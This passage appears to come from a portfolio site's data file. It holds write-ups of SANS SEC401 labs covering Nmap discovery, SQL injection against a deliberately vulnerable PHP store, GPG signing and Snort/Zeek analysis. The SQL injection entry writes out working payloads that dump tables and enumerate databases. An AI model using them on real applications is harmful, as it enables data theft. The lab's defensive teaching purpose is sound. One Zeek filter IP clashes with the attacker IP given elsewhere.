          "The docs host was advertising SSH on port 80, not 22. Connected with ssh -p 80 and authenticated into the Ubuntu 22.04 container. Non-standard service ports defeat naive scanners that only check well-known ports, which is exactly why -sV matters.",
        command: "ssh -p 80 root@172.28.14.23",
        commandBreakdown: "-p 80: connect to SSH running on port 80",
        screenshot: "/labs/network-discovery-145835.png",
      },
      {
        title: "Post-compromise: netstat on target",
        description:
          "From inside the docs host, listed listening sockets. Confirmed python3 listening on 0.0.0.0:8000, sshd on :80, a loopback resolver on 127.0.0.11:39563, and an established SSH session from the scanning host (172.28.14.1).",
        command: "netstat -anp",
        commandBreakdown: "-a: all sockets; -n: numeric addresses; -p: show owning process/PID",
        screenshot: "/labs/network-discovery-145853.png",
      },
      {
        title: "iptables rules for the new service",
        description:
          "Reviewed the INPUT chain. Port 8000 is only reachable from 172.28.14.23 (self) and loopback; every other source gets REJECT tcp-reset. That explains why the WSGI service only became visible once the scan originated from inside the lab subnet, it was firewalled from external sources.",
        command: "iptables -n -L",
        commandBreakdown: "-n: numeric output (no DNS/port name lookup)\n-L: list rules",
        screenshot: "/labs/network-discovery-145928.png",
      },
      {
        title: "Retrieve the served page",
        description:
          "curled localhost:8000 from the docs host. Response was the 'Alpha Developers' internal documentation portal built with mkdocs-material 9.4.14. Confirms what the port, the process, and the ndiff finding all hinted at: an internal docs site that should never have been exposed beyond loopback.",
        command: "curl localhost:8000",
        screenshot: "/labs/network-discovery-150029.png",
      },
    ],
    outcome:
      "Produced a reliable asset inventory of the /24, including services, versions, likely OS, and a meaningful diff against an older baseline. The ndiff workflow caught exactly the kind of drift that tends to go unnoticed in real environments, a new internal service quietly appearing on an existing host.",
    nextStepsInProduction:
      "In production I'd schedule the -sV XML scan on a cadence (weekly at minimum), store baselines in version control or an asset-management DB, and pipe ndiff output into a ticketing workflow so every new port/service change produces an owner-assigned ticket. I'd also run authenticated scans where possible, since unauthenticated Nmap misses a lot.",
    securityControlsRelevant: [
      "Asset inventory and CMDB accuracy",
      "Host-based firewalls (iptables / nftables) restricting service exposure",
      "Change-detection pipelines (ndiff, diff-based alerting)",
      "Service hardening: don't expose dev/docs sites on 0.0.0.0",
      "Non-standard port hygiene: document, don't rely on, port obscurity",
    ],
    keyFindings: [
      "7 live hosts on 172.28.14.0/24 mapped to the lab's container stack",
      "SSH running on TCP/80 on the docs host, a classic port-obfuscation pattern",
      "php-fpm:9000 exposed as cslistener, a service usually kept internal",
      "ndiff surfaced a new WSGIServer on docs:8000 between scans",
      "iptables restricted 8000/tcp to the host itself, firewall-layer control working as intended",
    ],
    takeaway: [
      "The part most people skip is the baseline. Running Nmap once gets you an asset list; running it twice and diffing with ndiff gets you a detection. That's the whole game in asset management: the first scan is inventory, the second scan is a signal. Most orgs never do the second scan.",
      "OS detection against containers is nearly useless, and that's worth internalizing. The lab returned 'no exact matches' on every host, then 96% confidence guesses across four different kernel families once --osscan-guess was enabled. In a real environment full of containers and cloud VMs, fingerprinting-based inventory is a weak signal. Better to enumerate via CPE from -sV and cross-reference with agent data.",
      "The SSH-on-80 finding is the kind of thing that trips up junior analysts. A top-1000 scan without -sV would have reported 80/tcp open http and moved on. -sV is what separates 'there's a web server here' from 'there's an SSH daemon pretending to be a web server.' On a real red team, mis-labeled ports are where defenders lose visibility.",
    ],
    screenshots: [
      { src: "/labs/network-discovery-143816.png", alt: "Step 1: Lab containers started", caption: "./start_3.1.sh (7 containers up)" },
      { src: "/labs/network-discovery-144231.png", alt: "Step 2: Ping sweep", caption: "nmap -sn 172.28.14.0/24 (7 hosts up)" },
      { src: "/labs/network-discovery-144327.png", alt: "Step 3: Greppable port sweeps", caption: "--top-ports 100 and -F with -oG -" },
      { src: "/labs/network-discovery-144751.png", alt: "Step 4: Service/version detection", caption: "nmap -sV 172.28.14.0/24" },
      { src: "/labs/network-discovery-144947.png", alt: "Step 5: OS detection strict", caption: "nmap -O (no exact matches)" },
      { src: "/labs/network-discovery-145219.png", alt: "Step 6: OS detection with guessing", caption: "nmap -O --osscan-guess" },
      { src: "/labs/network-discovery-145528.png", alt: "Step 7: XML baseline", caption: "nmap -sV -oX new_network.xml" },
      { src: "/labs/network-discovery-145601.png", alt: "Step 8: ndiff change detection", caption: "ndiff surfaced new WSGIServer on docs:8000" },
      { src: "/labs/network-discovery-145835.png", alt: "Step 9: SSH on port 80", caption: "ssh -p 80 root@172.28.14.23" },
      { src: "/labs/network-discovery-145853.png", alt: "Step 10: netstat -anp", caption: "python3 listening on 0.0.0.0:8000" },
      { src: "/labs/network-discovery-145928.png", alt: "Step 11: iptables rules", caption: "8000/tcp restricted to self + loopback" },
      { src: "/labs/network-discovery-150029.png", alt: "Step 12: curl the service", caption: "Alpha Developers mkdocs site served on :8000" },
    ],
  },
  {
    id: 9,
    courseSlug: "sec401",
    slug: "web-app-exploitation",
    title: "Web App Exploitation",
    course: "SEC401 - Vulnerability Management and Response",
    role: "Solo, Lab",
    focus: "Web Application Security",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized browser screenshots of the Alpha Inc. Merchandise catalog, injection payloads, DB enumeration, and WAF block response",
    tldr: [
      "Exploited a classic LIKE-based SQL injection in a PHP storefront",
      "Used stacked queries to dump database and table names via SHOW statements",
      "Deployed a WAF and verified it blocked the same payload (HTTP 418)",
    ],
    skillsDemonstrated: [
      "Manual SQL injection discovery",
      "Payload construction against LIKE clauses",
      "Stacked-query information disclosure (SHOW DATABASES, SHOW TABLES)",
      "Reading PHP stack traces for injection context",
      "WAF deployment and validation",
    ],
    context:
      "This lab exercises manual SQL injection against a deliberately vulnerable PHP storefront (store.alphainc.ca:8080) backed by MySQL, then deploys a WAF and re-tests to confirm the control works.",
    summary:
      "Discovered a SQL injection in Catalog.php's search parameter (LIKE '%<input>%'), dumped all products, enumerated databases and tables via stacked queries, then deployed the lab WAF and confirmed identical payloads were blocked with HTTP 418.",
    whyThisMatters:
      "SQL injection is still in the OWASP Top 10 in 2026, and LIKE-clause injection is the version most devs miss because parameterized queries alone don't help if the app concatenates the search term into the wildcard wrapper. This lab shows the full loop: discover, exploit, defend, re-verify.",
    tools: ["Firefox", "PHP/MySQL web app", "Manual SQL injection", "WAF (lab-provided)"],
    steps: [
      "Start lab stack: ./start_3.3.sh (nginx, php-fpm, MySQL)",
      "Browse store.alphainc.ca:8080/Catalog.php, inspect search form",
      "Submit empty search, observe Array () dump and MySQL stack trace",
      "Inject single quote: ' → SQL syntax error near '%'",
      "Inject ';-- → confirms injection is inside LIKE '%...%' clause",
      "Inject '; -- (trailing space) → returns all 17 products",
      "Stacked query: qq'; show databases; -- → dumps [Database, information_schema, OnlineShop]",
      "Deploy WAF: scripts/enable_waf.sh",
      "Re-send qq'; show tables; -- → WAF returns HTTP 418",
    ],
    stepDetails: [
      {
        title: "Lab environment startup",
        description:
          "Started the lab stack. Initial errors from stale containers, then three services came up: lab-33-php-nginx, lab-33-database, and lab-33-php-fpm. That's a classic PHP/MySQL storefront topology.",
        command: "cd /sec401/labs/3.3/ && ./start_3.3.sh",
        screenshot: "/labs/webapp-exploit-150444.png",
      },
      {
        title: "Inspect the target app",
        description:
          "Loaded store.alphainc.ca:8080/Catalog.php. The page exposes a category picker (attire, energy, exercise, lighting, toys, training) and a free-text search bar. The search bar is the obvious attack surface.",
        screenshot: "/labs/webapp-exploit-150731.png",
      },
      {
        title: "Leaking the query via error",
        description:
          "Submitted an empty search. The page printed both Array () (an empty result set) and a full PHP exception with the rendered SQL: SELECT * FROM Merchandise WHERE name LIKE '%'%'. That single line reveals: it's a LIKE query, the input is wrapped in single quotes, and stack traces are leaking to users, three serious issues before any payload.",
        screenshot: "/labs/webapp-exploit-150744.png",
      },
      {
        title: "Confirm injection with a single quote",
        description:
          "Submitted ' as the search term to confirm the injection context.",
        screenshot: "/labs/webapp-exploit-150917.png",
      },
      {
        title: "Baseline: a legitimate search result",
        description:
          "Ran a normal search to confirm the app returns product records with fields: Product Number, Item, Description, Price, Picture. The target table is clearly Merchandise.",
        screenshot: "/labs/webapp-exploit-150925.png",
      },
      {
        title: "Probe the LIKE boundary with ';--",
        description:
          "Submitted ';-- to close the string and try to comment out the trailing %'. The error message confirmed the resulting query: SELECT * FROM Merchandise WHERE name LIKE '%':--%', meaning MySQL didn't treat -- as a comment because it wasn't followed by whitespace.",
        screenshot: "/labs/webapp-exploit-151735.png",
      },
      {
        title: "Observed error response",
        description:
          "The server echoed the unsafe query directly back in the stack trace, a defender's nightmare because it tells the attacker exactly how to refine the payload.",
        screenshot: "/labs/webapp-exploit-151742.png",
      },
      {
        title: "Fix the payload: '; -- with trailing space",
        description:
          "MySQL's -- comment syntax requires a trailing space. Retried with '; --  (single quote, semicolon, dash-dash, space).",
        screenshot: "/labs/webapp-exploit-151918.png",
      },
      {
        title: "Full table dump via broken WHERE clause",
        description:
          "The payload produced SELECT * FROM Merchandise WHERE name LIKE '%'; --  %'. The first statement returned everything (LIKE '%' matches all rows), the rest got commented out. Result: all 17 products returned, confirming full data exfiltration from the table.",
        screenshot: "/labs/webapp-exploit-151924.png",
      },
      {
        title: "Stacked query: enumerate databases",
        description:
          "Graduated from data theft to server reconnaissance. Payload: qq'; show databases; --  . The mysqli driver in this app supports multiple statements, so the second statement executed.",
        screenshot: "/labs/webapp-exploit-153520.png",
      },
      {
        title: "Database enumeration success",
        description:
          "The page printed Array ( [0] => Database [1] => information_schema [2] => OnlineShop ). Confirmed the app's database is OnlineShop and stacked queries are fully allowed. From here an attacker can drop tables, write files, or escalate, the worst-case SQLi scenario.",
        screenshot: "/labs/webapp-exploit-153532.png",
      },
      {
        title: "Deploy the WAF",
        description:
          "Ran the lab's WAF enable script to put a filtering proxy in front of the app.",
        command: "scripts/enable_waf.sh",
        screenshot: "/labs/webapp-exploit-154228.png",
      },
      {
        title: "Re-test the same payload",
        description:
          "Replayed the stacked-query payload: qq'; show tables; --  . Same request, same target.",
        screenshot: "/labs/webapp-exploit-154243.png",
      },
      {
        title: "WAF blocks the request (HTTP 418)",
        description:
          "The WAF returned HTTP 418 ('I'm a teapot', a common non-standard block response). Identical payload, defeated. The app is still vulnerable at the code level, but the WAF gives the team time to fix it without leaving the front door open.",
        screenshot: "/labs/webapp-exploit-154304.png",
      },
    ],
    outcome:
      "Demonstrated the complete SQL injection lifecycle against a realistic PHP app: discovery from an error message, payload refinement for LIKE context, data exfiltration, information_schema enumeration via stacked queries, then defense validation with a WAF returning HTTP 418 on the same payload.",
    nextStepsInProduction:
      "Fix the root cause: parameterize the LIKE query with bound parameters and pre-escape the user input's % and _ wildcards. Disable multi-statement on the mysqli connection. Turn off verbose error rendering in production (display_errors=Off, log to a file only). Keep the WAF as defense in depth, not the only control.",
    securityControlsRelevant: [
      "Parameterized queries / prepared statements",
      "LIKE wildcard escaping (%, _)",
      "Disabling multi_query / stacked statements at the driver level",
      "Suppressing verbose error output in production",
      "WAF rules for SQLi (OWASP CRS)",
      "Least-privilege DB accounts (no SHOW DATABASES for app user)",
    ],
    keyFindings: [
      "Search input directly concatenated into LIKE '%...%'",
      "PHP exceptions leak the full SQL query to the browser",
      "Stacked queries enabled on the mysqli connection",
      "Full dump of Merchandise table achievable with '; -- ",
      "information_schema + OnlineShop databases disclosed via SHOW DATABASES",
      "WAF correctly blocks the same payloads after enablement (HTTP 418)",
    ],
    takeaway: [
      "LIKE-clause injection is underestimated because most devs think 'I'm using prepared statements, I'm safe.' But a prepared statement that binds user input as the LIKE pattern without escaping % and _ still lets an attacker return every row. The bug here isn't really string concatenation, it's treating user input as a complete pattern instead of a literal.",
      "The error page is worth as much as the injection itself. The stack trace echoed the exact generated SQL, which turned a five-minute exploit into a thirty-second one. In a real engagement I'd log 'SQL error: contact support' to the user and the full trace to a server-only log. Verbose errors in prod are a vulnerability amplifier.",
      "The WAF worked, and that matters, but the framing is important. The app code is still exploitable. If the WAF ruleset changes, if the attacker finds an encoding the rules don't cover, or if someone routes around the WAF (internal VPC access, misconfigured origin), the exposure comes back. WAFs are brake pads, not brake lines, they buy you time, they're not the fix.",
    ],
    screenshots: [
      { src: "/labs/webapp-exploit-150444.png", alt: "Lab stack startup", caption: "./start_3.3.sh (nginx + MySQL + php-fpm)" },
      { src: "/labs/webapp-exploit-150731.png", alt: "Catalog page", caption: "store.alphainc.ca:8080/Catalog.php" },
      { src: "/labs/webapp-exploit-150744.png", alt: "Empty search leaks SQL", caption: "Stack trace shows LIKE '%...%' query" },
      { src: "/labs/webapp-exploit-150917.png", alt: "Probe with '", caption: "Single quote breaks the query" },
      { src: "/labs/webapp-exploit-150925.png", alt: "Normal search baseline", caption: "Merchandise table columns visible" },
      { src: "/labs/webapp-exploit-151735.png", alt: "Payload ';--", caption: "-- not comment without trailing space" },
      { src: "/labs/webapp-exploit-151742.png", alt: "Error shows built query", caption: "'%':--%'" },
      { src: "/labs/webapp-exploit-151918.png", alt: "Payload '; -- ", caption: "Added trailing space to -- " },
      { src: "/labs/webapp-exploit-151924.png", alt: "All products returned", caption: "17 products dumped" },
      { src: "/labs/webapp-exploit-153520.png", alt: "Stacked query", caption: "qq'; show databases; -- " },
      { src: "/labs/webapp-exploit-153532.png", alt: "Databases enumerated", caption: "Database, information_schema, OnlineShop" },
      { src: "/labs/webapp-exploit-154228.png", alt: "Enable WAF", caption: "scripts/enable_waf.sh" },
      { src: "/labs/webapp-exploit-154243.png", alt: "Retry payload behind WAF", caption: "qq'; show tables; -- " },
      { src: "/labs/webapp-exploit-154304.png", alt: "WAF block", caption: "HTTP 418: WAF blocked the request" },
    ],
  },
  {
    id: 11,
    courseSlug: "sec401",
    slug: "hashing-cryptographic-validation",
    title: "Hashing and Cryptographic Validation",
    course: "SEC401 - Data Security Technologies",
    role: "Solo, Lab",
    focus: "Cryptography",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized terminal screenshots of sha256sum, GPG key generation, detached signatures, signature verification (good and bad), and exiftool metadata review",
    tldr: [
      "Proved SHA-256 is content-based by renaming a file (hash unchanged) vs. editing one byte (hash diverged)",
      "Generated an RSA 3072-bit GPG key, signed a file, imported a third-party public key",
      "Caught a tampered Bankruptcy.docx via a BAD signature, then verified a clean backup",
    ],
    skillsDemonstrated: [
      "SHA-256 file integrity validation",
      "GPG key generation and keyring management",
      "Detached signature creation and verification",
      "Public key import and trust model review",
      "Exif/document metadata triage",
      "Incident workflow: restoring from a signed backup after tamper detection",
    ],
    context:
      "This lab walks through the core building blocks of cryptographic integrity, hashing, key pairs, and digital signatures, using sha256sum and GnuPG. It ends with a realistic scenario: a suspected-tampered document that fails signature verification, forcing a restore from a backup whose signature is valid.",
    summary:
      "Used sha256sum and xxd to prove hashes are content-bound, generated an RSA 3072-bit GPG identity, produced a detached signature, imported Madison Jeffries's public key, flagged a tampered Bankruptcy.docx via a BAD signature from GPG, reviewed the metadata with exiftool, then restored a clean backup copy that verified cleanly.",
    whyThisMatters:
      "Hashing and signing are how defenders catch silent tampering, the attacker who changes one byte of a document, contract, or binary. Without integrity checks, you have no way to tell whether a file is the one the author sent or something an intermediate actor modified. This lab is the blue-team equivalent of 'don't trust the file, verify the signature.'",
    tools: ["sha256sum", "xxd", "sed", "gpg (GnuPG 2.2.27)", "exiftool"],
    steps: [
      "Create a file, hash it, rename it, hash again (identical)",
      "Edit one character with sed, re-hash (hash changes completely)",
      "gpg --full-generate-key (RSA 3072, no expiry)",
      "gpg --list-keys / --list-secret-keys to inspect keyring",
      "gpg --sign --armor --detach-sig on renamed-file.txt",
      "gpg --verify against the detached .asc",
      "gpg --import of Madison Jeffries's public key",
      "gpg --verify against Bankruptcy.docx (BAD signature)",
      "exiftool on the suspect Bankruptcy.docx to surface metadata",
      "Restore from backup and re-verify (Good signature)",
    ],
    stepDetails: [
      {
        title: "Hash is content-based, not name-based",
        description:
          "Created test-file.txt containing 'Hello'. Computed its SHA-256 (66a0...bb35f18), inspected the bytes with xxd (48 65 6c 6c 6f 0a = Hello\\n), then renamed the file to renamed-file.txt. Re-hashed: the digest was identical. Hashes are computed over file contents, not metadata.",
        command: "echo \"Hello\" > test-file.txt && sha256sum test-file.txt && xxd test-file.txt && mv test-file.txt renamed-file.txt && sha256sum renamed-file.txt",
        commandBreakdown: "echo \"Hello\" > file: write 6 bytes (Hello\\n) to a file\nsha256sum: compute SHA-256 digest\nxxd: hex + ASCII dump\nmv: rename without changing contents",
        screenshot: "/labs/hashing-crypto-204343.png",
      },
      {
        title: "One-byte change, completely different hash",
        description:
          "Used sed to change every H to h in place (a single-byte change: 0x48 → 0x68). Re-hashed: the digest went from 66a0...bb35f18 to 5891...6be03, no resemblance to the original. This is the avalanche property of SHA-256: small input changes produce massive output changes.",
        command: "sed -i 's/H/h/g' renamed-file.txt && sha256sum renamed-file.txt",
        commandBreakdown: "sed -i: edit file in place\n's/H/h/g': substitute H with h, globally",
        screenshot: "/labs/hashing-crypto-204457.png",
      },
      {
        title: "Generate an RSA 3072 GPG key",
        description:
          "Ran the interactive key generation wizard. Chose RSA and RSA (1), 3072-bit keysize, no expiration, identity sec401 <sec401@sans.org>. GPG generated primary signing/certification (SC) key and an encryption (E) subkey. Entropy-gathering prompt appeared twice because two primes needed to be generated.",
        command: "gpg --full-generate-key",
        commandBreakdown: "--full-generate-key: full interactive key generation (vs. quick-generate)",
        screenshot: "/labs/hashing-crypto-205115.png",
      },
      {
        title: "Inspect the keyring",
        description:
          "Listed public and secret keys. pub rsa3072 2026-04-13 [SC] with fingerprint A2B39B421129567517A5ECEA9B00C9116C092134, trust [ultimate] because it's our own key, plus a matching [E] encryption subkey. The secret-keys listing shows the same fingerprint under 'sec' confirming we hold the private half.",
        command: "gpg --list-keys && gpg --list-secret-keys",
        screenshot: "/labs/hashing-crypto-205251.png",
      },
      {
        title: "Sign a file with a detached ASCII-armored signature",
        description:
          "Produced an external .asc signature for renamed-file.txt. Detached sigs are the pattern used for release artifacts: ship the file and the .asc alongside each other. Verified locally and GPG reported 'Good signature from sec401' with the full fingerprint.",
        command: "gpg --sign --armor --output renamed-file.txt.asc --detach-sig renamed-file.txt && gpg --verify renamed-file.txt.asc",
        commandBreakdown: "--sign: sign\n--armor: ASCII-armored output (.asc, not binary .sig)\n--detach-sig: signature in a separate file",
        screenshot: "/labs/hashing-crypto-205432.png",
      },
      {
        title: "Import a third-party public key",
        description:
          "Imported Madison Jeffries's public key from the lab backup directory. Post-import, --list-keys shows two pubkeys: our own at [ultimate] trust and Jeffries's (D200...BD90, rsa4096) at [unknown] trust, which is the correct default, GPG doesn't extend trust just because you imported a key.",
        command: "gpg --import /sec401/labs/4.1/backup/backup-jeffries... && gpg --list-keys",
        screenshot: "/labs/hashing-crypto-205618.png",
      },
      {
        title: "BAD signature: tamper detected",
        description:
          "Verified a signed Bankruptcy.docx from mounted media. GPG reported 'BAD signature from Madison Jeffries'. Either the document or the signature file has been altered since it was signed. In a real workflow this is the point where you stop reading the file and escalate.",
        command: "gpg --verify /media/sec401/CDROM/Bankruptcy.docx.asc",
        screenshot: "/labs/hashing-crypto-205701.png",
      },
      {
        title: "Surface metadata with exiftool",
        description:
          "Pulled metadata off Bankruptcy.docx. ExifTool reported standard DOCX internals plus Application: Microsoft Office Word, Pages: 2, Total Edit Time: 2982555.3 days, an obviously bogus value that on its own is a tampering indicator. Metadata review complements the cryptographic signal: even without a signature, the edit-time field alone warrants investigation.",
        command: "exiftool /media/sec401/CDROM/Bankruptcy.docx",
        screenshot: "/labs/hashing-crypto-205741.png",
      },
      {
        title: "Restore from backup, re-verify",
        description:
          "Copied the signature backup to the lab folder. First verify attempt passed the .docx instead of the .asc (GPG rejected with 'no valid OpenPGP data found'). Re-ran against the .asc and GPG confirmed 'Good signature from Madison Jeffries' with a GPG WARNING that the key is not certified with a trusted signature, expected, because we haven't signed Jeffries's key with our own to extend trust.",
        command: "cp /media/sec401/CDROM/Bankruptcy.docx.asc /sec401/labs/4.1/backup/ && gpg --verify /sec401/labs/4.1/backup/Bankruptcy.docx.asc",
        screenshot: "/labs/hashing-crypto-210137.png",
      },
    ],
    outcome:
      "Walked the full integrity chain: hash-based validation for fast change detection, asymmetric signing for authenticity, and a realistic scenario where a tampered document is caught by a BAD signature and the incident resolves by restoring from a signed backup.",
    nextStepsInProduction:
      "In production I'd pin critical vendor public keys in configuration (not just the keyring), establish a web-of-trust or use a keyserver with signed keys, automate verification in CI/CD for any artifact download (release binaries, firmware, scripts), and log verification failures to SIEM so a single BAD signature raises an incident ticket rather than getting retried silently.",
    securityControlsRelevant: [
      "File integrity monitoring (hash-based)",
      "Code and document signing (GPG, Sigstore, cosign)",
      "Artifact verification in CI/CD pipelines",
      "Key management and rotation (HSMs, hardware keys)",
      "Trust model enforcement (--trusted-key, --trust-model)",
      "Metadata-based tamper indicators (exiftool, oletools)",
    ],
    keyFindings: [
      "SHA-256 is content-bound; renaming a file does not change its hash",
      "Single-byte edits produce avalanche-level hash changes",
      "RSA 3072 is the modern GPG default (2048 is no longer recommended)",
      "Detached .asc signatures are the preferred distribution format",
      "Bankruptcy.docx on the lab media fails signature verification (tampered)",
      "Bankruptcy.docx backup copy verifies cleanly (known-good version)",
      "exiftool's 'Total Edit Time: 2982555.3 days' is a tampering red flag on its own",
    ],
    takeaway: [
      "The rename vs. sed demo is the cleanest way to internalize what a hash actually is. Most junior analysts can recite 'SHA-256 is a digest' without ever seeing that renaming a file preserves the hash while changing a single ASCII character obliterates it. Once you've watched 66a0...bb35f18 become 5891...6be03 because of a one-byte swap, you stop confusing filename with content integrity.",
      "Signing is where most teams fall down operationally. Generating a key is trivial. Distributing the public key, training every consumer to verify before using, and keeping the private key somewhere that survives laptop loss, that's the actual work. In a production rollout I'd pair GPG with a hardware key (YubiKey in OpenPGP mode) so the private key never sits on disk, and I'd automate verification so humans aren't the last line of defense.",
      "The Bankruptcy.docx scenario is a good teaching moment for two reasons. First, the cryptographic signal (BAD signature) is binary and unambiguous, either the file is the one Jeffries signed or it isn't. Second, the exiftool follow-up shows why you don't rely on any single indicator: metadata, signatures, and hashes each catch different things. In a real investigation, you'd combine all three with a chain-of-custody log before you made a call about authenticity.",
    ],
    screenshots: [
      { src: "/labs/hashing-crypto-204343.png", alt: "Hash preserved across rename", caption: "sha256sum identical after mv" },
      { src: "/labs/hashing-crypto-204457.png", alt: "One byte changes the hash", caption: "sed H→h → entirely new digest" },
      { src: "/labs/hashing-crypto-205115.png", alt: "GPG key generation", caption: "RSA 3072, no expiry, sec401@sans.org" },
      { src: "/labs/hashing-crypto-205251.png", alt: "Keyring listing", caption: "pub/sec rsa3072 A2B3…2134" },
      { src: "/labs/hashing-crypto-205432.png", alt: "Detached signature + verify", caption: "Good signature from sec401" },
      { src: "/labs/hashing-crypto-205618.png", alt: "Imported Jeffries pubkey", caption: "rsa4096 D200…BD90 [unknown] trust" },
      { src: "/labs/hashing-crypto-205701.png", alt: "BAD signature", caption: "gpg --verify on tampered Bankruptcy.docx" },
      { src: "/labs/hashing-crypto-205741.png", alt: "exiftool metadata", caption: "Total Edit Time: 2982555.3 days (red flag)" },
      { src: "/labs/hashing-crypto-210137.png", alt: "Good signature from backup", caption: "Backup copy verifies cleanly" },
    ],
  },
  {
    id: 13,
    courseSlug: "sec401",
    slug: "ids-snort3-zeek",
    title: "Intrusion Detection and Network Security Monitoring with Snort3 and Zeek",
    course: "SEC401 - Data Security Technologies",
    role: "Solo, Lab",
    focus: "Intrusion Detection",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized terminal screenshots of Snort3 config validation, PCAP replay alerts, BPF-filtered runs, and Zeek log review",
    tldr: [
      "Validated Snort 3.1.73 config, scoped HOME_NET to the lab /16, replayed investigate.pcap through community rules",
      "Triaged 294 INDICATOR-SHELLCODE ssh CRC32 overflow alerts from 20.106.124.93 hitting 10.130.8.94:22",
      "Re-ran Snort with BPF focus and processed the same PCAP with Zeek + extract-all-files policy",
    ],
    skillsDemonstrated: [
      "Snort3 config validation (-T)",
      "Tuning HOME_NET for a target environment",
      "Snort rule-based PCAP analysis (-A alert_fast / alert_talos)",
      "BPF filtering inside Snort (--bpf)",
      "Zeek PCAP processing with custom policy scripts",
      "Reading Zeek log format (packet_filter.log, field headers)",
      "Correlating rule IDs to classifications and priorities",
    ],
    context:
      "This lab runs two IDS/NSM tools against the same investigation PCAP: Snort3 for signature-based detection and Zeek for protocol-aware logging and file extraction. The goal is to understand what each tool tells you, and where they overlap vs. complement each other.",
    summary:
      "Validated Snort 3.1.73 config, tightened HOME_NET to 10.130.0.0/16, ran the community ruleset against investigate.pcap, and surfaced an SSH CRC32 overflow shellcode pattern (294 alerts from 20.106.124.93 → 10.130.8.94:22). Re-ran Snort with a BPF filter pinned to the attacker IP, then processed the same PCAP with Zeek's extract-all-files policy and confirmed log output.",
    whyThisMatters:
      "Signature-based IDS (Snort) and protocol-aware NSM (Zeek) are the two workhorses of mid-market network monitoring. Knowing how to tune rules, scope HOME_NET, filter noise with BPF, and pivot into Zeek logs for file extraction is the day-to-day job of a SOC analyst triaging a detection.",
    tools: ["Snort 3.1.73.0", "Zeek", "snort3-community.rules", "BPF", "sed", "tshark-style workflow on PCAP"],
    steps: [
      "snort -T -c /sec401/labs/4.3/etc/snort.lua (validate config)",
      "sed HOME_NET to 10.130.0.0/16",
      "snort -T -c snort.lua -q (quiet re-validation)",
      "snort -c etc/snort.lua -q -r investigate.pcap -A alert_talos -R rules/snort3-community.rules (summary)",
      "snort … -A alert_fast (per-alert detail)",
      "snort … --bpf 'host 20.106.124.93' (focus on attacker)",
      "zeek -C -r ../investigate.pcap -f 'host 20.206.124.93' extract-all-files.zeek",
      "Review packet_filter.log fields with sed",
    ],
    stepDetails: [
      {
        title: "Validate the Snort3 config",
        description:
          "Ran Snort in test mode to confirm the lab's snort.lua loads cleanly. The output shows Snort 3.1.73.0 enumerating every compiled-in inspector: HTTP, HTTP2, TLS/SSL, SMTP, SSH, FTP, DCE-RPC variants, DNS, IEC104, Modbus, NetFlow, port_scan, the wizard (protocol auto-id), and stream reassembly for TCP/UDP/ICMP. Good baseline view of what Snort3 actually inspects out of the box.",
        command: "snort -T -c /sec401/labs/4.3/etc/snort.lua",
        commandBreakdown: "-T: test configuration and exit\n-c: path to snort.lua",
        screenshot: "/labs/ids-snort-zeek-162400.png",
      },
      {
        title: "Scope HOME_NET to the lab /16",
        description:
          "Replaced HOME_NET = 'any' with HOME_NET = '[10.130.0.0/16]' via sed. HOME_NET = any is the default but defeats most rules that pivot on direction ($HOME_NET vs. $EXTERNAL_NET). Setting a real CIDR makes rules meaningful.",
        command: "sed -i 's/HOME_NET = \\'any\\'/HOME_NET = \\'[10.130.0.0/16]\\'/' /sec401/labs/4.3/etc/snort.lua",
        screenshot: "/labs/ids-snort-zeek-162825.png",
      },
      {
        title: "Quiet re-validation",
        description:
          "Re-ran config test with -q to suppress startup noise. Clean exit means the HOME_NET edit is syntactically valid.",
        command: "snort -T -c /sec401/labs/4.3/etc/snort.lua -q",
        commandBreakdown: "-q: quiet mode (suppress banners)",
        screenshot: "/labs/ids-snort-zeek-162902.png",
      },
      {
        title: "PCAP replay with community rules: summary view",
        description:
          "Replayed investigate.pcap through Snort with the community rules and alert_talos output. The summary groups alerts by SID and signature: SERVER-WEBAPP robots.txt access (14), backup access (15), POLICY-OTHER Microsoft Windows Terminal server request attempt (218), INDICATOR-SHELLCODE ssh CRC32 overflow filler (294), PROTOCOL-ICMP Unusual PING (15). The 294-alert ssh CRC32 row is the obvious thing to pivot on, that's a classic 2001-era exploit signature.",
        command: "snort -c etc/snort.lua -q -r investigate.pcap -A alert_talos -R rules/snort3-community.rules",
        commandBreakdown: "-r: read from PCAP\n-A alert_talos: Talos-style summary (grouped)\n-R: ruleset to load",
        screenshot: "/labs/ids-snort-zeek-163058.png",
      },
      {
        title: "Per-alert detail with alert_fast",
        description:
          "Switched output mode to alert_fast for one-line-per-alert detail. Clearly shows [1:1325:14] INDICATOR-SHELLCODE ssh CRC32 overflow filler, Classification: Executable code was detected, Priority 1, TCP 20.106.124.93 → 10.130.8.94:22. Every alert traces to the same source IP hammering the same host's SSH port with what Snort identifies as exploit shellcode fillers.",
        command: "snort -c etc/snort.lua -q -r investigate.pcap -A alert_fast -R rules/snort3-community.rules",
        commandBreakdown: "-A alert_fast: one alert per line (best for piping to grep/awk)",
        screenshot: "/labs/ids-snort-zeek-163255.png",
      },
      {
        title: "BPF filter to focus the attacker",
        description:
          "Re-ran with --bpf 'host 20.106.124.93' to scope the analysis to one attacker IP. In a real PCAP triage, --bpf is how you drop the haystack size by 99% so the analyst can work on a specific host/port/flow without the ruleset processing noise.",
        command: "snort -c etc/snort.lua -q -r investigate.pcap -A alert_fast -R rules/snort3-community.rules --bpf 'host 20.106.124.93'",
        commandBreakdown: "--bpf: Berkeley Packet Filter expression; same syntax as tcpdump",
        screenshot: "/labs/ids-snort-zeek-170811.png",
      },
      {
        title: "Zeek: protocol-aware log + file extraction",
        description:
          "Switched to Zeek on the same PCAP with the extract-all-files policy. Zeek produces per-protocol logs (conn.log, http.log, ssh.log, files.log) and can reconstruct files out of flows. The directory listing shows packet_filter.log as the first artifact; after a longer run Zeek emits the full protocol-log set.",
        command: "zeek -C -r ../investigate.pcap -f 'host 20.206.124.93' /opt/zeek/share/zeek/policy/frameworks/files/extract-all-files.zeek",
        commandBreakdown: "-C: skip checksum validation (PCAP checksums often broken)\n-r: read from PCAP\n-f: BPF filter\nextract-all-files.zeek: reconstruct files from HTTP/FTP/SMB flows",
        screenshot: "/labs/ids-snort-zeek-171537.png",
      },
      {
        title: "Inspect Zeek log schema",
        description:
